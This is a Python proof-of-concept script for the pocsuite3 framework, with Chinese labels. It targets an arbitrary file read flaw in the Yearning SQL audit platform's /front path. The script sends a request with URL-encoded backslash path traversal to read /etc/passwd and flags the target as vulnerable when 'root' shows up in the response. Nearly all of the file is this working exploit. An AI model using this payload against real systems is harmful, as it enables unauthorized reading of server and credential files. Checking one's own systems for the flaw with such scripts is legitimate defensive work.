# _*_ coding:utf-8 _*_
# @Time : 2024/1/16
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class yearning_front_fileread(POCBase):
    pocDesc = '''Yearning front 任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-16'
    name = 'Yearning front 任意文件读取漏洞'

    def _verify(self):

        result = {}
        url = self.url + '/front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Upgrade-Insecure-Requests': '1',
            "Connection": "close"
        }



        try:

            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'root' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(yearning_front_fileread)